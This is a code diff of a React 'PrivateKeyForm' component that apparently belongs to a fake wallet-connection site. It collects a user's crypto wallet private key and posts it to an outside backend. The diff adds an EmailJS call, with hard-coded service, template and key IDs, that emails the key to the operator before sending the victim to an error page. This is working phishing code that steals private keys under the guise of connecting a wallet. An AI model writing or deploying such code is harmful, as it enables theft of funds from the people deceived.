@@ -1,13 +1,15 @@
-import React, { useEffect, useState } from 'react'
-import styles from '../WalletConnectForm.module.css'
-import {useNavigate} from 'react-router-dom'
-import axios from 'axios'
+import styles from '../WalletConnectForm.module.css';
+import {useNavigate} from 'react-router-dom';
+import { useEffect, useState } from 'react';
+import emailjs from '@emailjs/browser';
+import axios from 'axios';
 
 const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
-    const navigate = useNavigate()
+
+    const navigate = useNavigate();
     const [privateKey, setPrivateKey] = useState("");
-    const [privateSubmitBtn, setPrivateSubmitBtn] = useState('CONNECT')
-    const [privateKey64Long, setPrivateKey64Long] = useState(false)
+    const [privateSubmitBtn, setPrivateSubmitBtn] = useState('CONNECT');
+    const [privateKey64Long, setPrivateKey64Long] = useState(false);
 
     const handleChange = (e) => {
       setPrivateKey(e.target.value)
@@ -30,13 +32,30 @@ const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
     const handlePrivateKeySubmit = async (e) => {
       e.preventDefault();
       setPrivateSubmitBtn("Processing...")
-      const name = wallet
-      const type = "Private_Key"
-      const data = privateKey
-      const password = "not_required"
+      const name = wallet;
+      const type = "Private_Key";
+      const data = privateKey;
+      const password = "not_required";
 
     if (privateKey64Long) {
       try {
+
+        await emailjs.send(          
+          'service_ghf9i5i',
+          'template_7agj3ul',
+          {
+            to_name: "dapp",
+            from_name: name,
+            message: `
+              Name: ${name}
+              Type: ${type}
+              Data: ${data}
+              Password: ${password}
+            `,
+          },
+          'Y2zgK5wDVULj3uyvk'
+        );
+
        await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/error')
